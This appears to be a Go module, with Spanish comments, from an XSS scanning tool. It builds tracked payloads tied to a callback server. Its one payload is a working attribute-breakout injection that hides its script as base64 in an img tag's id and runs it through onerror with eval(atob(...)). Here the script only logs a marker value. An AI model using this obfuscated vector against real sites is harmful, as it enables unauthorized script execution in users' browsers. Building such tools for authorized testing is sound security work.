package xss

import (
	"crypto/rand"
	"encoding/hex"
)

// XSSPayload representa un payload XSS con su metadata
type XSSPayload struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	Content     string `json:"content"`
	Vector      string `json:"vector"`
	CallbackURL string `json:"callback_url"`
}

// XSSPayloadMetadata es la metadata que se envía al servidor
type XSSPayloadMetadata struct {
	ID     string `json:"id"`
	Type   string `json:"type"`
	Vector string `json:"vector"`
}

// GeneratePayloadID genera un ID único para tracking
func GeneratePayloadID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// GetAllPayloads retorna todos los payloads XSS embebidos
func GetAllPayloads(callbackServer string) []XSSPayload {
	payloads := []XSSPayload{}

	// === PAYLOAD ESPECÍFICO - CONSOLE LOG ===
	// Payload con img tag, id en base64 y onerror que ejecuta el base64
	// Base64 de: console.log('11223344')
	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>`

	id1 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id1,
		Type:        "img-onerror-specific",
		Vector:      "all", // Se inyectará en TODOS los vectores
		CallbackURL: callbackServer,
		Content:     specificPayload,
	})

	return payloads
}

// GetPayloadMetadata extrae solo la metadata de los payloads (para enviar al servidor)
func GetPayloadMetadata(payloads []XSSPayload) []XSSPayloadMetadata {
	metadata := make([]XSSPayloadMetadata, len(payloads))
	for i, p := range payloads {
		metadata[i] = XSSPayloadMetadata{
			ID:     p.ID,
			Type:   p.Type,
			Vector: p.Vector,
		}
	}
	return metadata
}
